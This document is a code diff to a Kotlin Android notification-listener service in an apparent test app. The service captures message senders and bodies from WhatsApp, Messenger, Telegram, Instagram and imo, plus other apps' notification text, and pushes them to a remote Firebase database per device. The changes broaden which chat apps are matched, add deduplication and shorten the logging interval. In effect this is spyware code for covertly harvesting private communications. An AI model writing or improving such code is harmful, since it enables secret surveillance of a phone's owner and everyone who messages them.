@@ -1,6 +1,8 @@
 package com.example.myapplicationtestweb
 
 import android.app.Notification
+import android.os.Build
+import android.os.Bundle
 import android.os.SystemClock
 import android.provider.Settings
 import android.service.notification.NotificationListenerService
@@ -13,17 +15,7 @@ class NotificationService : NotificationListenerService() {
 
     private lateinit var deviceId: String
     private val lastSentMap = ConcurrentHashMap<String, Long>()
-
-    private val socialApps = mapOf(
-        "com.whatsapp" to "whatsapp",
-        "com.whatsapp.w4b" to "whatsapp",
-        "com.facebook.orca" to "messenger",
-        "com.facebook.mlite" to "messenger",
-        "org.telegram.messenger" to "telegram",
-        "org.telegram.messenger.web" to "telegram",
-        "com.instagram.android" to "instagram",
-        "com.imo.android.imoim" to "imo"
-    )
+    private val recentMessageHashes = ConcurrentHashMap<String, Long>()
 
     override fun onCreate() {
         super.onCreate()
@@ -33,50 +25,63 @@ class NotificationService : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         super.onNotificationPosted(sbn)
         sbn?.let {
-            val pkg = it.packageName ?: ""
+            val pkg = (it.packageName ?: "").lowercase()
             val extras = it.notification.extras
             val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
             val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
-            
-            val appKey = socialApps[pkg]
+
+            // Determine social chat apps by package matching
+            val appKey = when {
+                pkg.contains("whatsapp") -> "whatsapp"
+                pkg.contains("facebook.orca") || pkg.contains("messenger") -> "messenger"
+                pkg.contains("telegram") || pkg.contains("challegram") -> "telegram"
+                pkg.contains("instagram") -> "instagram"
+                pkg.contains("imo") -> "imo"
+                else -> null
+            }
+
             if (appKey != null) {
-                // Social app logic
-                val now = SystemClock.elapsedRealtime()
-                val last = lastSentMap[pkg] ?: 0L
-                if (now - last > 5_000) {
-                    var finalSender = title
-                    var finalBody = text
-                    
-                    // Try MessagingStyle
+                var finalSender = title
+                var finalBody = text
+
+                // Extract conversation messages if MessagingStyle is present
+                try {
                     val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
                     if (messages != null && messages.isNotEmpty()) {
-                        val lastMessage = messages.last() as? android.os.Bundle
+                        val lastMessage = messages.last() as? Bundle
                         if (lastMessage != null) {
                             val msgText = lastMessage.getCharSequence("text")?.toString()
-                            val senderPerson = lastMessage.getParcelable<android.app.Person>("sender_person")
-                            if (msgText != null) finalBody = msgText
-                            if (senderPerson?.name != null) finalSender = senderPerson.name.toString()
+                            if (!msgText.isNullOrEmpty()) finalBody = msgText
+                            
+                            val senderName = lastMessage.getCharSequence("sender")?.toString()
+                            if (!senderName.isNullOrEmpty()) finalSender = senderName
                         }
                     }
+                } catch (e: Exception) {}
+
+                if (finalSender.isNotBlank() || finalBody.isNotBlank()) {
+                    // Deduplication based on sender + body + appKey
+                    val dedupeKey = "$appKey|$finalSender|$finalBody"
+                    val now = SystemClock.elapsedRealtime()
+                    val lastTime = recentMessageHashes[dedupeKey] ?: 0L
                     
-                    if (finalSender.isNotEmpty() || finalBody.isNotEmpty()) {
+                    if (now - lastTime > 4000) { // 4-second debounce per identical message
+                        recentMessageHashes[dedupeKey] = now
                         sendToChatLogs(appKey, pkg, finalSender, finalBody)
-                        lastSentMap[pkg] = now
                     }
                 }
             } else {
-                // General logging
+                // General notifications logging
                 val blacklistedApps = listOf(
                     "android", "com.android.settings", "com.android.systemui", 
-                    "com.google.android.gms", "com.google.android.vending", packageName
+                    "com.google.android.gms", "com.google.android.vending", packageName.lowercase()
                 )
                 if (blacklistedApps.any { b -> pkg.contains(b) }) return
-                
                 if (title.isEmpty() && text.isEmpty()) return
-                
+
                 val now = SystemClock.elapsedRealtime()
                 val last = lastSentMap[pkg] ?: 0L
-                if (now - last > 30_000) {
+                if (now - last > 15_000) {
                     sendToLogsBot(pkg, title, text)
                     lastSentMap[pkg] = now
                 }
@@ -110,7 +115,7 @@ class NotificationService : NotificationListenerService() {
         val database = FirebaseDatabase.getInstance(dbUrl)
         val deviceRef = database.reference.child("users").child(userId).child("devices").child(deviceId)
 
-        val appName = pkg.split(".").lastOrNull()?.capitalize() ?: pkg
+        val appName = pkg.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: pkg
         val logText = "🔔 [NOTIFICATION - $appName]\nTitle: $title\nText: $text"
 
         deviceRef.child("logs").push().setValue(mapOf(
